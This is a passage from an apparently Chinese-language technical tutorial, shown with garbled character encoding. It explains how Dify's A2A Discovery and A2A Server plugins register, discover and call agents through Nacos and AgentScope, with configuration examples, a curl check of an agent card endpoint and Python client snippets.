<li>é›†ä¸­åŒ–ç®¡ç†ï¼Œæ™ºèƒ½ä½“ä¿¡æ¯ç»Ÿä¸€ç»´æŠ¤ã€‚</li>
<li>æ”¯æŒåŠ¨æ€æ³¨å†Œå’Œæ³¨é”€ï¼Œæ— éœ€é‡å¯ Dify åº”ç”¨ã€‚</li>
<li>ä¸ Nacos ç”Ÿæ€æ— ç¼é›†æˆï¼Œäº«å—ä¼ä¸šçº§æ²»ç†èƒ½åŠ›ã€‚</li>
</ul>
<p>é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">discovery_type:</span> nacos
<span class="hljs-symbol">available_agent_names:</span> translator_agent,search_agent,code_agent
<span class="hljs-symbol">namespace_id:</span> <span class="hljs-keyword">public</span>
</code></pre>
<p><strong>URL æ¨¡å¼</strong></p>
<p>ç›´æ¥é€šè¿‡ A2A Agent çš„æ ‡å‡† URL è¿›è¡Œå‘ç°ï¼Œé€‚åˆæ— éœ€ Nacos çš„è½»é‡çº§åœºæ™¯ã€‚</p>
<p>é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">discovery_type: url</span>
<span class="hljs-section">available_agent_urls: {</span>
Â Â <span class="hljs-string">"translator_agent"</span>:Â <span class="hljs-string">"http://host1:8080/.well-known/agent.json"</span>,
Â Â <span class="hljs-string">"search_agent"</span>:Â <span class="hljs-string">"http://host2:8080/.well-known/agent.json"</span>
}
</code></pre>
<h4 data-id="heading-8">3.1.2 ä¸¤ä¸ªæ ¸å¿ƒå·¥å…·</h4>
<p><strong>è·å–æ™ºèƒ½ä½“ä¿¡æ¯ï¼ˆget_a2a_agent_informationï¼‰</strong></p>
<p>æŸ¥è¯¢æ‰€æœ‰é…ç½®çš„ A2A Agent çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>æ™ºèƒ½ä½“åç§°ï¼ˆagent_nameï¼‰</li>
<li>åŠŸèƒ½æè¿°ï¼ˆdescriptionï¼‰</li>
<li>æŠ€èƒ½åˆ—è¡¨ï¼ˆskillsï¼‰</li>
</ul>
<p>LLM é€šè¿‡è¿™äº›ä¿¡æ¯äº†è§£æ¯ä¸ªæ™ºèƒ½ä½“çš„èƒ½åŠ›ï¼Œä¸ºåç»­çš„æ™ºèƒ½é€‰æ‹©æä¾›ä¾æ®ã€‚</p>
<p><strong>è°ƒç”¨æ™ºèƒ½ä½“ï¼ˆcall_a2a_agentï¼‰</strong></p>
<p>æ ¹æ® LLM çš„é€‰æ‹©ï¼Œå‘æŒ‡å®šçš„ A2A Agent å‘é€æŸ¥è¯¢æ¶ˆæ¯å¹¶è·å–å“åº”ã€‚æ”¯æŒï¼š</p>
<ul>
<li>åŠ¨æ€é€‰æ‹©ç›®æ ‡æ™ºèƒ½ä½“</li>
<li>è‡ªå®šä¹‰æŸ¥è¯¢æ¶ˆæ¯</li>
<li>å®Œæ•´çš„ä¸Šä¸‹æ–‡ä¼ é€’</li>
</ul>
<h4 data-id="heading-9">3.1.3 æ™ºèƒ½ä½“åŠ¨æ€é€‰æ‹©å·¥ä½œæµ</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1988b532193a42c685e2849ba142412c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=IJsaPYiflwWTmlO1nR1sMktqR6k%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é€šè¿‡ä»¥ä¸Šä¸¤ç§å·¥å…·ååŒé…åˆï¼ŒDify ä¸­çš„ Agent å¯ä»¥å®ç°ï¼š</p>
<ol>
<li>
<p>å…¨é¢äº†è§£å¯ç”¨çš„æ™ºèƒ½ä½“èµ„æº</p>
</li>
<li>
<p>æ ¹æ®å…·ä½“ä»»åŠ¡æ™ºèƒ½åŒ¹é…æœ€ä½³æ™ºèƒ½ä½“</p>
</li>
<li>
<p>å®ç°çœŸæ­£çš„å¤šæ™ºèƒ½ä½“åŠ¨æ€åä½œ</p>
</li>
</ol>
<h3 data-id="heading-10">3.2 A2A Server æ’ä»¶ï¼šæš´éœ² Dify åº”ç”¨</h3>
<p>A2A Server æ’ä»¶è®© Dify åº”ç”¨èƒ½å¤Ÿä»¥æ ‡å‡† A2A åè®®å¯¹å¤–æä¾›æœåŠ¡ï¼Œä½¿å…¶ä»–æ™ºèƒ½ä½“èƒ½å¤Ÿå‘ç°å’Œè°ƒç”¨ã€‚</p>
<h4 data-id="heading-11">3.2.1 æ”¯æŒçš„åº”ç”¨ç±»å‹</h4>
<p>A2A Server æ”¯æŒå°†ä»¥ä¸‹ç±»å‹çš„ Dify åº”ç”¨æš´éœ²ä¸º A2A æ™ºèƒ½ä½“ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fd1a4d88df84e83ad4c8fd42c4e2394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=q9xUfSYv9y9Yjr8ioQS7lGkCLss%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-12">3.2.2 ä¸¤ä¸ªæ ¸å¿ƒç«¯ç‚¹</h4>
<p><strong>æ™ºèƒ½ä½“å…ƒæ•°æ®ç«¯ç‚¹ï¼ˆGET /.well-known/agent.jsonï¼‰</strong></p>
<p>è¿”å›ç¬¦åˆ A2A åè®®çš„ AgentCardï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æ™ºèƒ½ä½“åç§°ï¼ˆnameï¼‰</li>
<li>åŠŸèƒ½æè¿°ï¼ˆdescriptionï¼‰</li>
<li>è®¿é—®åœ°å€ï¼ˆurlï¼‰</li>
<li>ç‰ˆæœ¬ä¿¡æ¯ï¼ˆversionï¼‰</li>
<li>èƒ½åŠ›å£°æ˜ï¼ˆcapabilitiesï¼‰</li>
<li>æŠ€èƒ½åˆ—è¡¨ï¼ˆskillsï¼‰</li>
</ul>
<p>å¤–éƒ¨è°ƒç”¨æ–¹é€šè¿‡æ­¤ç«¯ç‚¹å‘ç°æ™ºèƒ½ä½“çš„èƒ½åŠ›å’Œè°ƒç”¨æ–¹å¼ã€‚</p>
<p><strong>JSON-RPC è°ƒç”¨ç«¯ç‚¹ï¼ˆPOST /a2aï¼‰</strong></p>
<p>å¤„ç† A2A åè®®æ ‡å‡†çš„ JSON-RPC è¯·æ±‚ã€‚æ”¯æŒï¼š</p>
<ul>
<li><code>message/send</code>Â æ–¹æ³•ï¼šå‘æ™ºèƒ½ä½“å‘é€æ¶ˆæ¯å¹¶è·å–å“åº”</li>
<li>å¤šè½®å¯¹è¯ä¸Šä¸‹æ–‡ç»´æŠ¤</li>
<li>å®Œæ•´çš„ä»»åŠ¡çŠ¶æ€ç®¡ç†</li>
</ul>
<h4 data-id="heading-13">3.2.3 Nacos è‡ªåŠ¨æ³¨å†Œ</h4>
<p>å¯ç”¨ Nacos æ³¨å†Œåï¼ŒA2A Server ä¼šåœ¨é¦–æ¬¡æ”¶åˆ° AgentCard è¯·æ±‚æ—¶è‡ªåŠ¨å°† Dify åº”ç”¨æ³¨å†Œåˆ° Nacos Agent Registryã€‚æ³¨å†Œåï¼Œå…¶ä»– A2A æ™ºèƒ½ä½“å¯ä»¥é€šè¿‡ Nacos å‘ç°å¹¶è°ƒç”¨è¯¥ Dify åº”ç”¨ã€‚</p>
<h4 data-id="heading-14">3.2.4 å¤šè½®å¯¹è¯æ”¯æŒ</h4>
<p>A2A Server åŸºäº Dify Plugin Storage å®ç°è·¨è¯·æ±‚çš„ä¼šè¯ä¸Šä¸‹æ–‡ç®¡ç†ï¼š</p>
<ul>
<li>è‡ªåŠ¨ç»´æŠ¤ conversation_id æ˜ å°„</li>
<li>æ”¯æŒè¿ç»­å¤šè½®å¯¹è¯</li>
<li>ä¼šè¯çŠ¶æ€æŒä¹…åŒ–å­˜å‚¨</li>
</ul>
<h2 data-id="heading-15">å®è·µæ•™ç¨‹ï¼šæ„å»ºå¤šæ™ºèƒ½ä½“åä½œåº”ç”¨</h2>
<p>æœ¬ç« å°†é€šè¿‡ä¸¤ä¸ªå…·ä½“æ¡ˆä¾‹ï¼Œåˆ†åˆ«æ¼”ç¤º A2A Discovery å’Œ A2A Server æ’ä»¶çš„ä½¿ç”¨æ–¹æ³•ã€‚</p>
<h3 data-id="heading-16">4.1 ä½¿ç”¨ A2A Discovery è°ƒç”¨å¤–éƒ¨æ™ºèƒ½ä½“</h3>
<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå…·ä½“æ¡ˆä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ A2A Discovery æ’ä»¶æ„å»ºä¸€ä¸ªå¤šæ™ºèƒ½ä½“åä½œçš„ AI åŠ©æ‰‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9ee4399a33c4d3fabc4520807525414~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=HGuNRa3uJy3Ns6JXbGBX2UMYtsw%3D" alt="Gemini_Generated_Image_th1f2vth1f2vth1f.png" loading="lazy"/></p>
<h4 data-id="heading-17">åœºæ™¯æè¿°</h4>
<p>å‡è®¾æˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªæ™ºèƒ½å®¢æœç³»ç»Ÿï¼Œéœ€è¦è°ƒç”¨ä»¥ä¸‹ä¸‰ä¸ªä¸“ä¸šæ™ºèƒ½ä½“ï¼š</p>
<ul>
<li><strong>ç¿»è¯‘æ™ºèƒ½ä½“ï¼š</strong> å¤„ç†å¤šè¯­è¨€ç¿»è¯‘éœ€æ±‚</li>
<li><strong>æœç´¢æ™ºèƒ½ä½“ï¼š</strong> æŸ¥è¯¢äº§å“ä¿¡æ¯å’ŒçŸ¥è¯†åº“</li>
<li><strong>å®¢æœæ™ºèƒ½ä½“ï¼š</strong> å¤„ç†è®¢å•æŸ¥è¯¢å’Œå”®åé—®é¢˜</li>
</ul>
<h4 data-id="heading-18">æ­¥éª¤ä¸€ï¼šåœ¨ Nacos æ³¨å†Œ A2A Agent</h4>
<p>å°† A2A Agent æ³¨å†Œåˆ° Nacos Agent Registry æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<p><strong>æ–¹å¼ä¸€ï¼šæ§åˆ¶å°æ‰‹åŠ¨æ³¨å†Œ</strong></p>
<ol>
<li>ç™»å½• MSE Nacos æ§åˆ¶å°2. è¿›å…¥ã€Œæ™ºèƒ½ä½“æ³¨å†Œä¸­å¿ƒã€3. æ·»åŠ å„ä¸ª A2A Agent çš„ä¿¡æ¯ï¼ˆåç§°ã€è®¿é—®åœ°å€ã€æè¿°ç­‰ï¼‰</li>
</ol>
<p><strong>æ–¹å¼äºŒï¼šAgentScope è‡ªåŠ¨æ³¨å†Œï¼ˆæ¨èï¼‰</strong></p>
<p>AgentScope <strong>[</strong> <strong>1]</strong> æ˜¯é˜¿é‡Œå·´å·´æ¨å‡ºçš„ä¸€æ¬¾ä»¥å¼€å‘è€…ä¸ºæ ¸å¿ƒï¼Œä¸“æ³¨äºå¤šæ™ºèƒ½ä½“å¼€å‘çš„å¼€æºæ¡†æ¶ã€‚å®ƒçš„æ ¸å¿ƒç›®æ ‡æ˜¯è§£å†³æ™ºèƒ½ä½“åœ¨æ„å»ºã€è¿è¡Œå’Œç®¡ç†ä¸­çš„éš¾é¢˜ï¼Œæä¾›ä¸€å¥—è¦†ç›–â€œå¼€å‘ã€éƒ¨ç½²ã€ç›‘æ§â€å…¨ç”Ÿå‘½å‘¨æœŸçš„ç”Ÿäº§çº§è§£å†³æ–¹æ¡ˆã€‚</p>
<p>AgentScope æœ€æ–°ç‰ˆæœ¬ä¸­ï¼Œå·²ç»å…¨é¢æ”¯æŒ A2A åè®®ï¼Œå¹¶é›†æˆ Nacos ä½œä¸º A2A Registry çš„é»˜è®¤å®ç°ï¼Œæ„å»ºäº†ä¸€å¥—ä»å¼€å‘åˆ°éƒ¨ç½²çš„å®Œæ•´åˆ†å¸ƒå¼å¤šæ™ºèƒ½ä½“åä½œä½“ç³»ã€‚ä½¿ç”¨ AgentScope æ„å»ºçš„ A2A Agent å¯ä»¥è‡ªåŠ¨æ³¨å†Œåˆ° Nacosï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®ã€‚ä»¥ä¸‹ä¸ºå‚è€ƒä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ agentscope_runtime.engine.appÂ importÂ AgentApp
fromÂ agentscope_runtime.engine.deployers.adapter.a2aÂ importÂ (
AgentCardWithRuntimeConfig,
)
fromÂ agentscope_runtime.engine.deployers.adapter.a2a.nacos_a2a_registryÂ importÂ (
NacosRegistry,
)
fromÂ v2.nacosÂ importÂ ClientConfigBuilder
<span class="hljs-comment"># åˆ›å»º Nacos Registry å®ä¾‹</span>
<span class="hljs-attr">registry</span> = NacosRegistry(
Â  Â  <span class="hljs-attr">nacos_client_config</span>=ClientConfigBuilder()
Â  Â  .server_address("mse-xxx.nacos.mse.aliyuncs.com:8848")
Â  Â Â <span class="hljs-comment"># å…¶ä»–å¯é€‰é…ç½®é¡¹</span>
Â  Â  .build()
)
<span class="hljs-attr">app</span> = AgentApp(
Â  Â  <span class="hljs-attr">app_name</span>=<span class="hljs-string">"translator_agent"</span>,
Â  Â  <span class="hljs-attr">app_description</span>=<span class="hljs-string">"TestAgent"</span>,
Â  Â Â <span class="hljs-comment"># åœ¨ a2a_config ä¸­é…ç½® registry</span>
Â  Â  <span class="hljs-attr">a2a_config</span>=AgentCardWithRuntimeConfig(registry=registry),
)
</code></pre>
<p>æ›´å¤šé›†æˆæ–¹å¼è¯·å‚è€ƒÂ AgentScope å®˜æ–¹æ–‡æ¡£ <strong>[</strong> <strong>2]</strong> ã€‚</p>
<h4 data-id="heading-19">æ­¥éª¤äºŒï¼šå®‰è£…é…ç½® A2A Discovery æ’ä»¶</h4>
<ol>
<li>
<p>åœ¨ Dify æ’ä»¶å¸‚åœºæœç´¢ã€ŒA2A Agent Clientã€æˆ–ç›´æ¥è®¿é—®æ’ä»¶é¡µé¢ <strong>[</strong> <strong>3]</strong></p>
</li>
<li>
<p>ç‚¹å‡»å®‰è£…æ’ä»¶</p>
</li>
<li>
<p>é…ç½® Nacos è¿æ¥ä¿¡æ¯ï¼š</p>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fa81a876eba49f8977a625e9f1a06f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=xSfHycH0yS6K30pW2VfragoJe8A%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-20">æ­¥éª¤ä¸‰ï¼šåˆ›å»º Dify Agent åº”ç”¨</h4>
<ol>
<li>
<p>åœ¨ Dify ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ Agent åº”ç”¨</p>
</li>
<li>
<p>æ·»åŠ  A2A Discovery æ’ä»¶çš„ä¸¤ä¸ªå·¥å…·ï¼š</p>
<ul>
<li><code>get_a2a_agent_information</code></li>
<li><code>call_a2a_agent</code></li>
</ul>
</li>
<li>
<p>é…ç½®å·¥å…·å‚æ•°ï¼š</p>
</li>
</ol>

<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">discovery_type:</span> nacos
<span class="hljs-symbol">available_agent_names:</span> translator_agent,search_agent,customer_service_agent
<span class="hljs-symbol">namespace_id:</span> <span class="hljs-keyword">public</span>
</code></pre>
<p>4.  è®¾ç½®ç³»ç»Ÿæç¤ºè¯ï¼š</p>

<pre><code class="hljs language-markdown" lang="markdown">ä½ æ˜¯ä¸€ä¸ªæ™ºèƒ½å®¢æœåŠ©æ‰‹ï¼Œå¯ä»¥è°ƒç”¨å¤šä¸ªä¸“ä¸šæ™ºèƒ½ä½“æ¥å¤„ç†ç”¨æˆ·è¯·æ±‚ã€‚
å·¥ä½œæµç¨‹ï¼š
<span class="hljs-bullet">1.</span>Â é¦–å…ˆè°ƒç”¨ get<span class="hljs-emphasis">_a2a_</span>agent<span class="hljs-emphasis">_information è·å–æ‰€æœ‰å¯ç”¨æ™ºèƒ½ä½“çš„ä¿¡æ¯
2. æ ¹æ®ç”¨æˆ·çš„é—®é¢˜ç±»å‹ï¼Œé€‰æ‹©æœ€åˆé€‚çš„æ™ºèƒ½ä½“
3. è°ƒç”¨ call_</span>a2a<span class="hljs-emphasis">_agent å‘é€‰ä¸­çš„æ™ºèƒ½ä½“å‘é€è¯·æ±‚
4. æ•´åˆå“åº”ç»“æœï¼Œä¸ºç”¨æˆ·æä¾›å®Œæ•´çš„ç­”æ¡ˆ
å¯ç”¨çš„æ™ºèƒ½ä½“åŒ…æ‹¬ç¿»è¯‘ã€æœç´¢ã€å®¢æœç­‰ï¼Œè¯·æ ¹æ®ä»»åŠ¡ç‰¹ç‚¹æ™ºèƒ½é€‰æ‹©ã€‚
</span></code></pre>
<h4 data-id="heading-21">æ­¥éª¤å››ï¼šæµ‹è¯•éªŒè¯</h4>
<p>éƒ¨ç½²åº”ç”¨åï¼Œå°è¯•ä»¥ä¸‹å¯¹è¯ï¼š</p>
<p><strong>ç”¨æˆ·</strong>ï¼šè¯·å¸®æˆ‘æŠŠ"How to return the product?"ç¿»è¯‘æˆä¸­æ–‡</p>
<p><strong>AI åŠ©æ‰‹ï¼ˆå†…éƒ¨æµç¨‹ï¼‰:</strong></p>
<ol>
<li>
<p>è°ƒç”¨Â <code>get_a2a_agent_information</code>Â è·å–æ™ºèƒ½ä½“åˆ—è¡¨</p>
</li>
<li>
<p>è¯†åˆ«è¿™æ˜¯ç¿»è¯‘ä»»åŠ¡ï¼Œé€‰æ‹©Â <code>translator_agent</code></p>
</li>
<li>
<p>è°ƒç”¨Â <code>call_a2a_agent</code>Â å‘é€ç¿»è¯‘è¯·æ±‚</p>
</li>
<li>
<p>è¿”å›ç¿»è¯‘ç»“æœ</p>
</li>
</ol>
<p><strong>ç”¨æˆ·ï¼š</strong> æˆ‘æƒ³æŸ¥è¯¢è®¢å• #12345 çš„ç‰©æµçŠ¶æ€</p>
<p><strong>AI åŠ©æ‰‹ï¼ˆå†…éƒ¨æµç¨‹ï¼‰ï¼š</strong></p>
<ol>
<li>
<p>è¯†åˆ«è¿™æ˜¯å®¢æœé—®é¢˜ï¼Œé€‰æ‹©Â <code>customer_service_agent</code></p>
</li>
<li>
<p>è°ƒç”¨æ™ºèƒ½ä½“è·å–è®¢å•ä¿¡æ¯</p>
</li>
<li>
<p>è¿”å›ç‰©æµçŠ¶æ€</p>
</li>
</ol>
<h3 data-id="heading-22">4.2 ä½¿ç”¨ A2A Server æš´éœ² Dify åº”ç”¨</h3>
<p>ç°åœ¨è®©æˆ‘ä»¬æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ A2A Server æ’ä»¶å°† Dify åº”ç”¨æš´éœ²ä¸º A2A æ™ºèƒ½ä½“ï¼Œè®©å…¶ä»–ç³»ç»Ÿèƒ½å¤Ÿå‘ç°å’Œè°ƒç”¨ã€‚</p>
<h4 data-id="heading-23">åœºæ™¯æè¿°</h4>
<p>å‡è®¾æˆ‘ä»¬å·²ç»åœ¨ Dify ä¸­æ„å»ºäº†ä¸€ä¸ªå¼ºå¤§çš„ã€Œæ™ºèƒ½å®¢æœåŠ©æ‰‹ã€åº”ç”¨ï¼Œç°åœ¨å¸Œæœ›å°†å…¶æš´éœ²ä¸º A2A æ™ºèƒ½ä½“ï¼Œè®©ï¼š</p>
<ul>
<li>å…¶ä»– AgentScope åº”ç”¨å¯ä»¥è°ƒç”¨</li>
<li>å…¶ä»– A2A ç”Ÿæ€ä¸­çš„æ™ºèƒ½ä½“å¯ä»¥å‘ç°å¹¶åä½œ</li>
<li>å¤–éƒ¨ AI åº”ç”¨å¯ä»¥é€šè¿‡æ ‡å‡†åè®®æ¥å…¥</li>
</ul>
<h4 data-id="heading-24">æ­¥éª¤ä¸€ï¼šå®‰è£… A2A Server æ’ä»¶</h4>
<ol>
<li>åœ¨ Dify æ’ä»¶å¸‚åœºæœç´¢ã€ŒA2A Serverã€æˆ–ç›´æ¥è®¿é—®æ’ä»¶é¡µé¢ <strong>[</strong> <strong>4]</strong> 2. ç‚¹å‡»å®‰è£…æ’ä»¶</li>
</ol>
<h4 data-id="heading-25">æ­¥éª¤äºŒï¼šåˆ›å»º Endpoint</h4>
<ol>
<li>
<p>è¿›å…¥æ’ä»¶ç®¡ç†é¡µé¢ï¼Œæ‰¾åˆ° A2A Server æ’ä»¶</p>
</li>
<li>
<p>ç‚¹å‡»ã€Œåˆ›å»º Endpointã€</p>
</li>
<li>
<p>é…ç½®åŸºæœ¬å‚æ•°ï¼š</p>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74ef4b05b1854ab0836f6b802ca2cdd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=XC3a3AoxlaujcXMDGLCg4ibb3zE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol start="4">
<li>ç‚¹å‡»ä¿å­˜ï¼ŒDify ä¼šç”Ÿæˆ Endpoint ID</li>
</ol>
<h4 data-id="heading-26">æ­¥éª¤ä¸‰ï¼šæ›´æ–°æ­£ç¡®çš„ URL</h4>
<p>ä¿å­˜åï¼Œè·å–ç”Ÿæˆçš„ Endpoint IDï¼ˆå¦‚Â abc123ï¼‰ï¼Œç„¶åï¼š</p>
<ol>
<li>è¿”å›ç¼–è¾‘ Endpoint2. å°† Agent Public URL æ›´æ–°ä¸ºæ­£ç¡®çš„åœ°å€ï¼š</li>
</ol>

<pre><code class="hljs language-bash" lang="bash">Â https://your-domain.com/e/abc123/a2a
</code></pre>
<p>3.  ä¿å­˜é…ç½®</p>
<p>æœ€ç»ˆçš„ A2A ç«¯ç‚¹ï¼š</p>
<ul>
<li><strong>AgentCard åœ°å€ï¼š</strong> <code>https://your-domain.com/e/{endpoint_id}/a2a/.well-known/agent.json</code></li>
<li><strong>JSON-RPC åœ°å€ï¼š</strong> <code>https://your-domain.com/e/{endpoint_id}/a2a</code></li>
</ul>
<h4 data-id="heading-27">æ­¥éª¤å››ï¼šé…ç½® Nacos æ³¨å†Œï¼ˆå¯é€‰ï¼‰</h4>
<p>å¦‚æœå¸Œæœ›æ™ºèƒ½ä½“èƒ½è¢«è‡ªåŠ¨å‘ç°ï¼Œå¯ä»¥é…ç½® Nacos æ³¨å†Œï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30826bc53689426294276471b8a2eb6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=efzgcfyn5kwJ41LojXK6AwXaH6Y%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-28">æ­¥éª¤äº”ï¼šæµ‹è¯•éªŒè¯</h4>
<p><strong>æµ‹è¯• AgentCard è·å–</strong></p>
<pre><code class="hljs language-bash" lang="bash">curl https://your-domain.com/e/{endpoint_id}/a2a/.well-known/agent.json
</code></pre>
<p>æˆåŠŸè¿”å›ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â Â <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"smart-service-agent"</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"æ™ºèƒ½å®¢æœåŠ©æ‰‹ï¼Œæ”¯æŒè®¢å•æŸ¥è¯¢ã€å”®åæœåŠ¡ã€äº§å“å’¨è¯¢"</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"https://your-domain.com/e/abc123/a2a"</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"capabilities"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>
Â  Â Â <span class="hljs-attr">"streaming"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"push_notifications"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
Â Â <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"skills"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">[</span>
Â  Â Â <span class="hljs-punctuation">{</span>
Â  Â  Â Â <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"dify_app"</span><span class="hljs-punctuation">,</span>
Â  Â  Â Â <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"smart-service-agent"</span><span class="hljs-punctuation">,</span>
Â  Â  Â Â <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"æ™ºèƒ½å®¢æœåŠ©æ‰‹ï¼Œæ”¯æŒè®¢å•æŸ¥è¯¢ã€å”®åæœåŠ¡ã€äº§å“å’¨è¯¢"</span>
Â  Â Â <span class="hljs-punctuation">}</span>
Â Â <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>æµ‹è¯•æ¶ˆæ¯å‘é€</strong></p>
<p>ä½¿ç”¨ A2A SDK æˆ–å…¼å®¹å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ a2a.clientÂ importÂ A2AClient
<span class="hljs-attr">client</span> = A2AClient(<span class="hljs-string">"https://your-domain.com/e/{endpoint_id}/a2a"</span>)
<span class="hljs-attr">response</span> = client.send_message(<span class="hljs-string">"æˆ‘æƒ³æŸ¥è¯¢è®¢å• #12345 çš„çŠ¶æ€"</span>)
print(response.text)
</code></pre>
<h4 data-id="heading-29">ä¸ AgentScope é›†æˆ</h4>
<p>AgentScope é…ç½®å®Œæˆåï¼ŒAgentScope åº”ç”¨å¯ä»¥é€šè¿‡ Nacos è‡ªåŠ¨å‘ç°å¹¶è°ƒç”¨è¯¥ Dify æ™ºèƒ½ä½“ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ agentscope.agentÂ importÂ A2AAgent
fromÂ agentscope.a2aÂ importÂ NacosAgentCardResolver
fromÂ agentscope.messageÂ importÂ Msg
<span class="hljs-comment"># Python AgentScope v1.0.11ä»¥ä¸Š</span>
<span class="hljs-comment"># åˆ›å»º Nacos AgentCard Resolver</span>
<span class="hljs-attr">nacos_resolver</span> = NacosAgentCardResolver(
Â  Â  <span class="hljs-attr">remote_agent_name</span>=<span class="hljs-string">"my-remote-agent"</span>, Â <span class="hljs-comment"># Nacos ä¸­æ³¨å†Œçš„æ™ºèƒ½ä½“åç§°</span>
Â  Â  <span class="hljs-attr">nacos_client_config</span>=ClientConfig(
Â  Â  Â  Â  <span class="hljs-attr">server_addresses</span>=<span class="hljs-string">"http://localhost:8848"</span>, Â <span class="hljs-comment"># Nacos æœåŠ¡å™¨åœ°å€</span>
Â  Â  Â  Â Â <span class="hljs-comment"># å…¶ä»–å¯é€‰é…ç½®é¡¹</span>
Â  Â  ),
)
<span class="hljs-comment"># ä½¿ç”¨ Resolver åˆ›å»º A2AAgentï¼Œé€šè¿‡åç§°ä» Nacos å‘ç° Agent</span>
<span class="hljs-attr">agent</span> = A2AAgent(
Â  Â  <span class="hljs-attr">agent_card</span>=awaitÂ nacos_resolver.get_agent_card()
)
</code></pre>
<p>æ›´å¤šé›†æˆæ–¹å¼è¯·å‚è€ƒÂ AgentScope å®˜æ–¹æ–‡æ¡£ã€‚</p>
<h2 data-id="heading-30">Nacos Agent Registry ä¼ä¸šçº§èƒ½åŠ›</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/641a9c243b794e65b2fa90dec840431d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=1PrDjIKSKrLCnszxYEqgJMduT5s%3D" alt="Gemini_Generated_Image_qyzu2tqyzu2tqyzu.png" loading="lazy"/></p>
